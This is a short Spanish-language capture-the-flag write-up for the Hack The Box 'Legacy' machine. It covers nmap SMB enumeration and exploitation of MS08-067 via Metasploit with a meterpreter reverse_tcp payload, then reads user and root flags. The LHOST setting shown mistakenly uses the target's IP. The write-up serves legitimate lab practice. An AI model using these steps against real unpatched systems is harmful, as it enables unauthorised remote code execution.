---
{"-publish":true,"permalink":"/hack-the-box/machines/easy/legacy/","PassFrontmatter":true}
---

Empezamos haciendo un nmap a la maquina:

```
nmap -sCV -T5 10.10.10.4 -oN legacy_machine
```

![[Pasted image 20250522172723.png\|Pasted image 20250522172723.png]]

Observamos que la maquina es un windows XP lo cual puede indicar que quiza es vulnerable a SMB, enumeramos:

```
nmap -p 445 --script smb-vuln* 10.10.10.4
```

![[Pasted image 20250522173331.png\|Pasted image 20250522173331.png]]

Notamos que es vulnerable a CVE:CVE-2017-0143 ->EternalBlue y > **MS08-067: Microsoft Windows Server Service Vulnerability**

Descripcion: Esta vulnerabilidad critica del servicio de red de Windows (Server Service) que permite ejecucion remota de codigo (RCE) mediante paquetes especialmente creados enviados a traves del puerto 139 o 445 (SMB).

## Sistemas afectados:

- Windows XP
- Windows Server 2003
- Windows Vista
- Windows Server 2008 (versiones antiguas)
- Windows 2000

## Impacto

- Permite ejecucion remoda de codigo sin autenticacion.
- Fue ampliamente explotada por gusanos como Conficker.

Vamos a probar explotar esta vulnerabilidad con metasploit:

## Explotacion con Metasploit:

- use exploit/windows/smb/ms08_067_netapi
- set RHOST 10.10.10.4
- set PAYLOAD windows/meterpreter/reverse_tcp
- set LHOST 10.10.10.4
- run

![[Pasted image 20250522174921.png\|Pasted image 20250522174921.png]]

Si queremos saber bajo que usuario se ejecuta el exploit potemos colocar en el **meterpreter> getuid**

![[Pasted image 20250522175033.png\|Pasted image 20250522175033.png]]
Luego colocar un shell para ser mas interactivos y buscamos el user.txt y el root.txt

En este caso como estamos en Windows XP, los usuarios los encontramos en **dir C:\\Documents and Settings**

![[Pasted image 20250522175409.png\|Pasted image 20250522175409.png]]

Vamos a john para el user.txt:

![[Pasted image 20250522175504.png\|Pasted image 20250522175504.png]]

Vamos a administrator para el root.txt:

![[Pasted image 20250522175546.png\|Pasted image 20250522175546.png]]

thanks.